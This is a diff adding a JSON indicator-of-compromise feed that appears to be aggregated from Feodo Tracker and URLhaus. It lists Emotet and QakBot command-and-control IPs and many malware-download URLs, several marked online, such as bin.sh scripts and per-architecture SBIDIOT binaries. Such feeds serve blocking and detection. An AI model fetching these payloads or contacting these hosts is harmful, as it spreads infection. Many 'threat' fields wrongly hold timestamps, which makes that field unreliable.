@@ -1,0 +1,5030 @@
+{
+  "last_updated_utc": "2026-07-02T09:17:51.658712+00:00",
+  "structured_iocs": [
+    {
+      "value": "162.243.103.246",
+      "type": "ip",
+      "threat": "Emotet",
+      "source": "Feodo Tracker",
+      "source_url": "https://feodotracker.abuse.ch",
+      "tags": [
+        "c2",
+        "emotet"
+      ],
+      "first_seen": "2022-06-04 21:24:53",
+      "last_seen": "",
+      "country": "US"
+    },
+    {
+      "value": "50.16.16.211",
+      "type": "ip",
+      "threat": "QakBot",
+      "source": "Feodo Tracker",
+      "source_url": "https://feodotracker.abuse.ch",
+      "tags": [
+        "c2",
+        "qakbot"
+      ],
+      "first_seen": "2025-12-30 13:56:31",
+      "last_seen": "",
+      "country": "US"
+    },
+    {
+      "value": "34.204.119.63",
+      "type": "ip",
+      "threat": "QakBot",
+      "source": "Feodo Tracker",
+      "source_url": "https://feodotracker.abuse.ch",
+      "tags": [
+        "c2",
+        "qakbot"
+      ],
+      "first_seen": "2026-01-13 21:41:15",
+      "last_seen": "",
+      "country": "US"
+    },
+    {
+      "value": "178.62.3.223",
+      "type": "ip",
+      "threat": "QakBot",
+      "source": "Feodo Tracker",
+      "source_url": "https://feodotracker.abuse.ch",
+      "tags": [
+        "c2",
+        "qakbot"
+      ],
+      "first_seen": "2026-02-17 05:41:23",
+      "last_seen": "",
+      "country": "GB"
+    },
+    {
+      "value": "27.133.154.218",
+      "type": "ip",
+      "threat": "QakBot",
+      "source": "Feodo Tracker",
+      "source_url": "https://feodotracker.abuse.ch",
+      "tags": [
+        "c2",
+        "qakbot"
+      ],
+      "first_seen": "2026-03-04 14:28:39",
+      "last_seen": "",
+      "country": "JP"
+    },
+    {
+      "value": "http://175.107.16.92:35222/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 09:08:15",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879248/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:08:15",
+      "status": "online"
+    },
+    {
+      "value": "http://196.191.102.114:38503/i",
+      "type": "url",
+      "threat": "2026-07-02 09:08:13",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879247/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:08:13",
+      "status": "online"
+    },
+    {
+      "value": "http://222.141.135.164:44986/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 09:07:14",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879246/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:07:14",
+      "status": "online"
+    },
+    {
+      "value": "http://123.148.191.5:43457/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 09:06:19",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879245/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:06:19",
+      "status": "online"
+    },
+    {
+      "value": "http://27.44.146.241:41434/i",
+      "type": "url",
+      "threat": "2026-07-02 09:03:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879244/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:03:24",
+      "status": "online"
+    },
+    {
+      "value": "http://42.231.216.73:49020/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 09:03:17",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879243/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 09:03:17",
+      "status": "online"
+    },
+    {
+      "value": "https://ke9j9z10.interwettenbet.com/?ublib=f85752d6-893f-4adb-b5d3-9a7f38cd59ca",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879242/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:54:22",
+      "status": "offline"
+    },
+    {
+      "value": "http://103.249.199.3:49713/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:54:13",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879241/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:54:13",
+      "status": "online"
+    },
+    {
+      "value": "https://fuotcd3b.futshart.pro/?ublib=e3125e1b-3b16-435a-b248-9251f527da2a",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879240/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:53:21",
+      "status": "offline"
+    },
+    {
+      "value": "https://fzkx5dg3.estekhdam.online/?ublib=21b76d5c-fd5a-4d37-b920-ca63a234606b",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879239/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:42:08",
+      "status": "offline"
+    },
+    {
+      "value": "http://91.92.242.236/files-129312398/files/file_81f4790593aec5b4.exe",
+      "type": "url",
+      "threat": "2026-07-02 08:41:11",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879238/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:41:11",
+      "status": "online"
+    },
+    {
+      "value": "http://212.164.115.235:55869/i",
+      "type": "url",
+      "threat": "2026-07-02 08:41:10",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879237/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:41:10",
+      "status": "online"
+    },
+    {
+      "value": "http://39.90.178.76:33468/i",
+      "type": "url",
+      "threat": "2026-07-02 08:40:26",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879236/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:40:26",
+      "status": "online"
+    },
+    {
+      "value": "http://27.44.146.241:41434/bin.sh",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879235/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:38:33",
+      "status": "offline"
+    },
+    {
+      "value": "http://103.24.110.240:56640/i",
+      "type": "url",
+      "threat": "2026-07-02 08:36:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879234/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:36:23",
+      "status": "online"
+    },
+    {
+      "value": "http://46.163.134.250:44332/i",
+      "type": "url",
+      "threat": "2026-07-02 08:35:25",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879233/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:35:25",
+      "status": "online"
+    },
+    {
+      "value": "http://46.163.134.250:44332/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:28:26",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879232/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:28:26",
+      "status": "online"
+    },
+    {
+      "value": "http://110.39.232.190:60500/i",
+      "type": "url",
+      "threat": "2026-07-02 08:24:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879231/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:24:29",
+      "status": "online"
+    },
+    {
+      "value": "http://110.37.53.25:58088/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:17:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879229/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:17:08",
+      "status": "online"
+    },
+    {
+      "value": "http://115.55.51.220:54353/i",
+      "type": "url",
+      "threat": "2026-07-02 08:17:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879230/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:17:08",
+      "status": "online"
+    },
+    {
+      "value": "http://39.90.178.76:33468/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:15:26",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879228/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:15:26",
+      "status": "online"
+    },
+    {
+      "value": "http://110.39.232.190:60500/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:13:10",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879227/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:13:10",
+      "status": "online"
+    },
+    {
+      "value": "http://103.24.110.240:56640/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:12:22",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879226/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:12:22",
+      "status": "online"
+    },
+    {
+      "value": "http://212.164.115.235:55869/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:06:06",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879225/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 08:06:06",
+      "status": "online"
+    },
+    {
+      "value": "http://119.179.255.178:46276/i",
+      "type": "url",
+      "threat": "2026-07-02 07:58:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879224/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:58:23",
+      "status": "online"
+    },
+    {
+      "value": "http://182.127.38.31:48902/i",
+      "type": "url",
+      "threat": "2026-07-02 07:52:27",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879223/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:52:27",
+      "status": "online"
+    },
+    {
+      "value": "http://112.242.46.30:39449/i",
+      "type": "url",
+      "threat": "2026-07-02 07:49:39",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879222/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:49:39",
+      "status": "online"
+    },
+    {
+      "value": "http://112.248.100.184:47063/i",
+      "type": "url",
+      "threat": "2026-07-02 07:32:07",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879221/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:32:07",
+      "status": "online"
+    },
+    {
+      "value": "http://41.201.226.25:51089/i",
+      "type": "url",
+      "threat": "2026-07-02 07:31:26",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879220/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:31:26",
+      "status": "online"
+    },
+    {
+      "value": "http://119.179.255.178:46276/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 07:27:28",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879219/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:27:28",
+      "status": "online"
+    },
+    {
+      "value": "http://93.115.101.146:13734/narz",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879218/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:23:32",
+      "status": "offline"
+    },
+    {
+      "value": "http://112.248.100.184:47063/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 07:11:28",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879217/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:11:28",
+      "status": "online"
+    },
+    {
+      "value": "http://42.55.31.104:40005/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 07:11:09",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879216/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:11:09",
+      "status": "online"
+    },
+    {
+      "value": "http://115.48.144.123:35521/i",
+      "type": "url",
+      "threat": "2026-07-02 07:08:25",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879215/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:08:25",
+      "status": "online"
+    },
+    {
+      "value": "http://77.236.74.65:57977/i",
+      "type": "url",
+      "threat": "2026-07-02 07:07:06",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879214/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:07:06",
+      "status": "online"
+    },
+    {
+      "value": "http://110.36.69.52:44150/i",
+      "type": "url",
+      "threat": "2026-07-02 07:02:18",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879213/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 07:02:18",
+      "status": "online"
+    },
+    {
+      "value": "http://103.143.167.155:46548/i",
+      "type": "url",
+      "threat": "2026-07-02 06:59:18",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879212/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:59:18",
+      "status": "online"
+    },
+    {
+      "value": "https://5werloog.funxbet.live/?ublib=aa822f15-e605-4e31-817a-98f3b29523e4",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879211/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:51:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/x86_64",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879210/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:37",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/m6db",
+      "type": "url",
+      "threat": "2026-07-02 06:42:33",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879209/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:33",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/sparc",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879206/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:32",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/i586",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879207/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:32",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/mips64",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879208/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:32",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/XVj",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879205/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:31",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/xZPw",
+      "type": "url",
+      "threat": "2026-07-02 06:42:16",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879204/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:16",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/arm7",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879201/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:15",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/arm5",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879202/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:15",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/v9c9",
+      "type": "url",
+      "threat": "2026-07-02 06:42:15",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879203/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:15",
+      "status": "online"
+    },
+    {
+      "value": "http://129.121.114.124/VyS5",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879200/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:42:14",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/lyV",
+      "type": "url",
+      "threat": "2026-07-02 06:41:27",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879198/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:27",
+      "status": "online"
+    },
+    {
+      "value": "http://129.121.114.124/DsI5",
+      "type": "url",
+      "threat": "2026-07-02 06:41:27",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879199/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:27",
+      "status": "online"
+    },
+    {
+      "value": "http://129.121.114.124/eXE",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879192/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/5KP",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879193/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/jR6",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879194/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/82L",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879195/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/4wIL",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879196/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/l4dw",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879197/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:25",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/hUf",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879190/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:24",
+      "status": "offline"
+    },
+    {
+      "value": "http://129.121.114.124/egV",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879191/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:41:24",
+      "status": "offline"
+    },
+    {
+      "value": "http://103.143.167.155:46548/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 06:30:35",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879189/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:30:35",
+      "status": "online"
+    },
+    {
+      "value": "https://rfdatuh.yek.boats/274c6c72-a290-48d6-9444-eeb61f2d3356",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879188/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:27:34",
+      "status": "offline"
+    },
+    {
+      "value": "http://98.252.87.232:50861/bin.sh",
+      "type": "url",
+      "threat": "2026-07-02 07:08:38",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879187/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:12:09",
+      "status": "online"
+    },
+    {
+      "value": "http://5.182.210.61/290f4c",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879186/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:41",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/879e82",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879179/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/194f8f",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879180/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/2c3233",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879181/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/807837",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879182/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/154b5a",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879183/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/81b63c",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879184/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/d204cb",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879185/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:40",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/552826",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879177/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:39",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/a6c968",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879178/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:39",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/300614",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879175/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:38",
+      "status": "offline"
+    },
+    {
+      "value": "http://5.182.210.61/2eb685",
+      "type": "url",
+      "threat": "",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879176/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:07:38",
+      "status": "offline"
+    },
+    {
+      "value": "http://42.230.29.8:33974/i",
+      "type": "url",
+      "threat": "2026-07-02 08:14:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879172/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:04:26",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/spc",
+      "type": "url",
+      "threat": "2026-07-02 07:32:53",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879173/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:04:26",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/arc",
+      "type": "url",
+      "threat": "2026-07-02 07:56:18",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879174/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:04:26",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/root",
+      "type": "url",
+      "threat": "2026-07-02 08:19:56",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879170/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:03:22",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/yarn",
+      "type": "url",
+      "threat": "2026-07-02 07:24:45",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879171/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:03:22",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/zte",
+      "type": "url",
+      "threat": "2026-07-02 06:34:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879165/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:02:25",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/m68k",
+      "type": "url",
+      "threat": "2026-07-02 08:26:50",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879166/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:02:25",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/rtk",
+      "type": "url",
+      "threat": "2026-07-02 07:26:28",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879167/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:02:25",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/mpsl",
+      "type": "url",
+      "threat": "2026-07-02 07:25:15",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879168/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:02:25",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/mips",
+      "type": "url",
+      "threat": "2026-07-02 08:41:53",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879169/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:02:25",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/ohshit.sh",
+      "type": "url",
+      "threat": "2026-07-02 08:40:30",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879162/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:01:23",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/sh4",
+      "type": "url",
+      "threat": "2026-07-02 08:28:27",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879163/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:01:23",
+      "status": "online"
+    },
+    {
+      "value": "http://182.114.35.68:53667/i",
+      "type": "url",
+      "threat": "2026-07-02 07:55:05",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879164/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:01:23",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/x86",
+      "type": "url",
+      "threat": "2026-07-02 08:35:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879161/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:01:22",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/arm6",
+      "type": "url",
+      "threat": "2026-07-02 08:35:30",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879160/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-07-02 06:01:18",
+      "status": "online"
+    },
+    {
+      "value": "http://5.175.217.137/SBIDIOT/arm",
+      "type": "url",
+      "threat": "2026-07-02 07:24:09",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3879158/",
